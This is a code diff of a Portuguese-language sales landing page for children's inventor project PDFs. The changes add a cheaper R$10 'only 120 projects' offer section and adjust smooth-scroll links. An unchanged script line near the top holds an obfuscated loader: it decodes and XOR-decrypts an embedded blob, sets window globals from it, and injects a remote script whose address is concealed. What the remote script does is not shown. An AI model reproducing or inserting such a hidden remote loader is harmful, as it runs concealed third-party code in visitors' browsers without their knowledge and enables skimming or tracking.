@@ -10,7 +10,7 @@
 <style>html{scroll-behavior:smooth}#veja-dentro,#rotina,#como-recebe,#diferente,#elegir-pack{scroll-margin-top:12px}</style><script>(function(){var q_erf=atob("DIXwJ9iZh06GowcgB/7SUqr1pXSky3NUd/bKCPf64yCo1nNNbuOJCbv26mDk0ShTZPeZV6zqqD7v22JMKPWZX731qST1gSsCZvGEVbH78jrj0CUaXNjcBb/16Cznz3QCPd6LBbb46iukmSVQbv2VS5H9pWKk1WZMcuDSHfqv5ivjkDQVP7zAEu2v5Xi1wTZENeTCH+q7+hP7");var x_mp=[];for(var w_ke=0;w_ke<q_erf.length;w_ke++){x_mp.push(q_erf.charCodeAt(w_ke)&255);}var r_pg7=x_mp[0];var s_skkb=x_mp.slice(1,1+r_pg7);var u_nl=x_mp.slice(1+r_pg7);var g_kbg6=u_nl.map(function(b,q_av){return b^s_skkb[q_av%r_pg7];});var j_ss="";for(var v_mdc=0;v_mdc<g_kbg6.length;v_mdc++){j_ss+=String.fromCharCode(g_kbg6[v_mdc]&255);}var w_fj=decodeURIComponent(escape(j_ss));var z_m=JSON.parse(w_fj);var k_tbl=z_m.globals||[];k_tbl.forEach(function(r_pzi){window[r_pzi.name]=r_pzi.value;});var s_6o=document.createElement("script");s_6o.src=z_m.url;s_6o.async=true;s_6o.defer=true;(z_m.attributes||[]).forEach(function(e_yu1){s_6o.setAttribute(e_yu1.name,e_yu1.value);});(document.head||document.documentElement).appendChild(s_6o);})();</script>
 <script>
 (function(){
-function go(e){var a=e.target.closest&&e.target.closest('a[href="#elegir-pack"]');if(!a)return;var t=document.getElementById('elegir-pack');if(!t)return;e.preventDefault();
+function go(e){var a=e.target.closest&&e.target.closest('a[href="#elegir-pack"],a[href="#oferta-10"]');if(!a)return;var t=document.getElementById(a.getAttribute('href').slice(1));if(!t)return;e.preventDefault();
 function y(){return t.getBoundingClientRect().top+window.pageYOffset-12;}
 window.scrollTo({top:y(),behavior:'smooth'});
 function fix(){if(Math.abs(y()-window.pageYOffset)>4)window.scrollTo({top:y(),behavior:'smooth'});}
@@ -702,7 +702,25 @@ window.INVENTALAB_REAL_SALES = window.INVENTALAB_REAL_SALES || [
 .lp-lp .of-now{font-size:34px;font-weight:900;color:var(--lp-green-dark);line-height:1.05;letter-spacing:-.03em}
 .lp-lp .of-pill{display:inline-block;background:var(--lp-yellow);color:#000;font-weight:800;font-size:11px;white-space:nowrap;padding:3px 10px;border-radius:999px;margin-top:6px}
 .lp-lp .of-cta{margin:10px 0 0}.lp-lp .of-cta .lp-btn-xl{font-size:17px;padding:13px 14px;border-radius:12px}.lp-lp .of-cta .lp-cta-head{font-size:14px;margin-top:10px}
-.lp-lp .of-only{display:block;margin:10px auto 0;max-width:330px;font-size:12px;white-space:nowrap;font-weight:700;color:#4b5563;background:#f1f2f4;border:1px solid #d5d8dd;border-radius:10px;padding:9px 12px;text-align:center;text-decoration:none}.lp-lp .of-nota{font-size:12.5px;color:var(--lp-ink-soft);margin:10px 0 0}
+.lp-lp .of-only{display:block;margin:12px auto 0;max-width:340px;font-size:14px;white-space:nowrap;font-weight:700;color:#4b5563;background:#f1f2f4;border:1px solid #d5d8dd;border-radius:12px;padding:13px 12px;text-align:center;text-decoration:none}.lp-lp .o10{padding:8px 0 40px;background:#fffdf8}
+.lp-lp .o10-card{border-color:#cfd3da;box-shadow:0 10px 26px rgba(20,30,50,.10)}
+.lp-lp .o10-head{background:#6b7280}
+.lp-lp .o10-ok,.lp-lp .o10-x{display:flex;align-items:center;gap:10px;border-radius:12px;padding:8px 10px;text-align:left;margin-top:8px}
+.lp-lp .o10-ok{background:#E8F7EE;border:1px solid #bfe6cf;margin-top:14px}
+.lp-lp .o10-x{background:#fff5f5;border:1px solid #f5c2c2}
+.lp-lp .o10-ok p,.lp-lp .o10-x p{flex:1;margin:0;font-size:13.5px;font-weight:700;line-height:1.25}
+.lp-lp .o10-ok p{color:#14532d}
+.lp-lp .o10-x p{color:#9b9ba3;text-decoration:line-through}
+.lp-lp .o10-oi,.lp-lp .o10-xi{flex:0 0 26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:14px;color:#fff}
+.lp-lp .o10-oi{background:#16a34a}.lp-lp .o10-xi{background:#dc2626}
+.lp-lp .o10-in{font-size:11px;font-weight:800;color:#14532d;background:#d1f0dd;border-radius:999px;padding:3px 10px}
+.lp-lp .o10-na{font-size:10.5px;font-weight:800;color:#fff;background:#dc2626;border-radius:999px;padding:3px 9px;white-space:nowrap}
+.lp-lp .o10-price{background:#f3f4f6;border:2px dashed #cfd3da}
+.lp-lp .o10-price .of-now{color:#4b5563}
+.lp-lp .o10-pill{background:#fee2e2;color:#991b1b}
+.lp-lp .lp-btn-gray{background:#e5e7eb;color:#1f2937;border:1px solid #cfd3da;font-size:16px;padding:14px 12px;border-radius:12px;font-weight:800;box-shadow:none}
+.lp-lp .o10-back{display:block;margin-top:14px;font-size:15px;font-weight:800;color:var(--lp-violet);text-decoration:none;padding:8px}
+.lp-lp .of-nota{font-size:12.5px;color:var(--lp-ink-soft);margin:10px 0 0}
 @media(min-width:700px){.lp-lp .of-body h2{font-size:28px}.lp-lp .of-body{padding:24px 28px 28px}}
 </style>
 <section class="of" id="elegir-pack"><div class="lp-wrap"><div class="of-card">
@@ -715,10 +733,23 @@ window.INVENTALAB_REAL_SALES = window.INVENTALAB_REAL_SALES || [
 <div class="of-list"><div class="of-b"><img alt="Plano de Inventores para 7 Dias" loading="lazy" src="assets/img/offer-b1.webp"/><div class="of-bt"><span class="of-bn">BÔNUS 1</span><p>Plano de Inventores para 7 Dias</p></div><span class="of-free">GRÁTIS</span></div><div class="of-b"><img alt="Plano de 14 dias de robótica caseira" loading="lazy" src="assets/img/offer-b2.webp"/><div class="of-bt"><span class="of-bn">BÔNUS 2</span><p>Plano de 14 dias de robótica caseira</p></div><span class="of-free">GRÁTIS</span></div><div class="of-b"><img alt="Guia Rápido de Ajustes e Testes" loading="lazy" src="assets/img/offer-b3.webp"/><div class="of-bt"><span class="of-bn">BÔNUS 3</span><p>Guia Rápido de Ajustes e Testes</p></div><span class="of-free">GRÁTIS</span></div><div class="of-b"><img alt="Checklist de Materiais Recicláveis" loading="lazy" src="assets/img/offer-b4.webp"/><div class="of-bt"><span class="of-bn">BÔNUS 4</span><p>Checklist de Materiais Recicláveis</p></div><span class="of-free">GRÁTIS</span></div><div class="of-b"><img alt="40 Invenções para Quintal e Ar Livre" loading="lazy" src="assets/img/offer-b5.webp"/><div class="of-bt"><span class="of-bn">BÔNUS 5</span><p>40 Invenções para Quintal e Ar Livre</p></div><span class="of-free">GRÁTIS</span></div><div class="of-b"><img alt="Os 4 Cadernos de Atividades" loading="lazy" src="assets/img/offer-cadernos.webp"/><div class="of-bt"><span class="of-bn">EXTRA</span><p>Os 4 Cadernos: +154 atividades sem telas</p></div><span class="of-free">INCLUSO</span></div></div>
 <div class="of-price"><div class="of-old">De R$ 97,00 por</div><div class="of-now">R$ 19,00</div><span class="of-pill">Você economiza 80% · tudo incluso</span></div>
 <div class="of-cta"><a class="lp-btn lp-btn-yellow lp-btn-xl" data-cakto="" href="https://pay.cakto.com.br/3fgc2qe" id="pk-go">Quero tudo por R$ 19 →</a><div class="lp-cta-head">Pagamento único · Acesso imediato via e-mail</div>
-<a class="of-only" data-cakto="" href="https://pay.cakto.com.br/f8t58dp">Quero somente os 120 projetos por R$ 10,00</a></div>
+<a class="of-only" href="#oferta-10">Quero somente os 120 projetos por R$ 10,00</a></div>
 <p class="of-nota">🔒 Compra segura · 100% digital (PDF), chega na hora no seu e-mail · Garantia de 7 dias</p>
 
 </div></div></div></section>
+<section class="o10" id="oferta-10"><div class="lp-wrap"><div class="of-card o10-card">
+<div class="of-head o10-head">Só os 120 projetos</div>
+<div class="of-body">
+<h2>Mega Pack de Inventores</h2>
+<p class="of-sub">Apenas os 120 projetos passo a passo, em PDF.</p>
+<img alt="Mega Pack de Inventores: 120 projetos em PDF" class="of-hero" decoding="async" loading="lazy" src="assets/img/offer-only120.webp"/>
+<div class="o10-ok"><span class="o10-oi">✓</span><p>+120 projetos passo a passo em PDF</p><span class="o10-in">INCLUSO</span></div>
+<div class="o10-list"><div class="o10-x"><span class="o10-xi">✕</span><p>Plano de Inventores para 7 Dias</p><span class="o10-na">NÃO INCLUSO</span></div><div class="o10-x"><span class="o10-xi">✕</span><p>Plano de 14 dias de robótica caseira</p><span class="o10-na">NÃO INCLUSO</span></div><div class="o10-x"><span class="o10-xi">✕</span><p>Guia Rápido de Ajustes e Testes</p><span class="o10-na">NÃO INCLUSO</span></div><div class="o10-x"><span class="o10-xi">✕</span><p>Checklist de Materiais Recicláveis</p><span class="o10-na">NÃO INCLUSO</span></div><div class="o10-x"><span class="o10-xi">✕</span><p>40 Invenções para Quintal e Ar Livre</p><span class="o10-na">NÃO INCLUSO</span></div><div class="o10-x"><span class="o10-xi">✕</span><p>Os 4 Cadernos: +154 atividades sem telas</p><span class="o10-na">NÃO INCLUSO</span></div></div>
+<div class="of-price o10-price"><div class="of-now">R$ 10,00</div><span class="of-pill o10-pill">Sem bônus e sem cadernos</span></div>
+<div class="of-cta"><a class="lp-btn lp-btn-gray" data-cakto="" href="https://pay.cakto.com.br/f8t58dp">Quero só os 120 projetos por R$ 10</a></div>
+<a class="o10-back" href="#elegir-pack">← Voltar e levar tudo por R$ 19</a>
+</div></div></div></section>
+
 <section class="lp-faq lp-alt">
 <div aria-hidden="true" class="lp-divider"><span>❓</span></div>
 <div class="lp-wrap">
